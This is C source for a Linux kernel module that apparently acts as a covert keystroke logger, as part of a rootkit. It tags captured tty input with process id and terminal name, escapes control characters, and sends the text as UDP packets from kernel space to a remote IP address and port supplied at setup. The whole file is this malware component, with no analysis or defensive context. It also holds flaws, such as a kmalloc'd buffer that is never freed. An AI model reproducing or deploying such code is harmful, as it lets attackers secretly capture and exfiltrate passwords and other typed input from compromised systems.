#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/slab.h>
#include <linux/inet.h>
#include <net/sock.h>
#include <net/inet_common.h>

#include "common.h"
#include "inputlog.h"

#define BUFLEN 64
#define UDP_MAX_DATA_LEN 65507

struct socket *sock = NULL;
struct sockaddr_in addr, bind;

static int
build_header(char *buf, pid_t pid, struct file *file)
{
    sprintf(buf, "[%-5d tty%-3s] ", pid, file->f_path.dentry->d_name.name);
    return 15;
}

static int
expand_escape_chars(char *buf, const char *src, int srclen)
{
    size_t i;
    int buflen;
    char c;

#define EXPAND_ESCAPE(x) \
    do{ *(buf++) = '\\'; *(buf++) = (x); buflen += 2; } while(0)

    for (buflen = 0, i = 0; i < srclen; ++i) {
        switch ((c = src[i])) {
        case '\a': EXPAND_ESCAPE('a');   break;
        case '\b': EXPAND_ESCAPE('b');   break;
        case '\e': EXPAND_ESCAPE('e');   break;
        case '\f': EXPAND_ESCAPE('f');   break;
        case '\n': EXPAND_ESCAPE('n');   break;
        case '\r': EXPAND_ESCAPE('r');   break;
        case '\t': EXPAND_ESCAPE('t');   break;
        case '\v': EXPAND_ESCAPE('v');   break;
        case '\"': EXPAND_ESCAPE('\"');  break;
        case '\'': EXPAND_ESCAPE('\'');  break;
        case '\?': EXPAND_ESCAPE('?');   break;
        default: *(buf++) = c; ++buflen; break;
        }
    }

    *buf = '\0';
    return buflen;
}

void
send_udp(pid_t pid, struct file *file, char *buf, int buflen)
{
    int session_hdrlen, session_buflen, packlen;
    char *session_buf, *session_bdy;
    struct msghdr msg;
    struct kvec iov;
    mm_segment_t fs;

    if (!sock)
        return;

    packlen = 0;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_flags = 0;
    msg.msg_name = &addr;
    msg.msg_namelen = sizeof(addr);

    session_buf = (char *)kmalloc(BUFLEN + buflen * 2, GFP_KERNEL);
    session_hdrlen = build_header(session_buf, pid, file);
    session_bdy = session_buf + session_hdrlen;
    session_buflen = expand_escape_chars(session_bdy, buf, buflen);
    session_buflen += session_hdrlen + 1;
    session_buf[session_buflen - 1] = '\n';

    DEBUG_INFO("testing: %s\n", session_buf);

    while (session_buflen > 0) {
        packlen = (session_buflen < UDP_MAX_DATA_LEN)
            ? session_buflen : UDP_MAX_DATA_LEN;

        iov.iov_len = packlen;
        iov.iov_base = session_buf;

        session_buflen -= packlen;
        session_buf += packlen;

        fs = get_fs();
        set_fs(KERNEL_DS);
        kernel_sendmsg(sock, &msg, &iov, 1, packlen);
        set_fs(fs);
    }
}

void
log_input(const char *ip, const char *port)
{
    size_t i;
    u8 ip_quad[4];
    unsigned long remote_ip_ul, local_ip_ul;
    unsigned long remote_port_ul, local_port_ul;

    if (sock)
        return;

    if (sock_create_kern(&init_net, PF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock))
        return;

    { // parse ip address and port from passed in strings
        kstrtoul(port, 10, &remote_port_ul);
        in4_pton(ip, -1, ip_quad, -1, NULL);

        remote_ip_ul = 0;
        for (i = 0; i < 4; ++i)
            remote_ip_ul |= (ip_quad[3 - i] & 0xFF) << (8 * i);

        local_ip_ul = (127 << 24) | (0 << 16) | (0 << 8) | 1;
        local_port_ul = 7777;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(remote_ip_ul);
    addr.sin_port = htons(remote_port_ul);

    bind.sin_family = AF_INET;
    bind.sin_addr.s_addr = htonl(local_ip_ul);
    bind.sin_port = htons(local_port_ul);

    if (kernel_bind(sock, (struct sockaddr *)&bind, sizeof(bind))) {
        sock_release(sock);
        sock = NULL;
    }
}

void
unlog_input(void)
{
    if (!sock)
        return;

    sock_release(sock);
    sock = NULL;
}
